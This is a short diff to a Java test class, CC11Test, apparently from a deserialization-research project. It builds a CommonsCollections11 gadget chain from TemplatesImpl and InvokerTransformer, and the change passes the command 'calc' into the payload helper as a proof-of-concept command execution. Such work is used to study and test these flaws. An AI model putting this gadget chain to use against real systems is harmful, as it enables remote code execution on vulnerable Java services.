@@ -18,7 +18,7 @@ import java.util.HashSet;
 public class CC11Test {
     public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException, CannotCompileException, InstantiationException, NotFoundException {
         // 利用javas
-        TemplatesImpl templates = GadgetUtils.templatesImplLocalWindows();
+        TemplatesImpl templates = GadgetUtils.templatesImplLocalWindows("calc");
 
 
         InvokerTransformer transformer = new InvokerTransformer("asdfasdfasdf", new Class[0], new Object[0]);
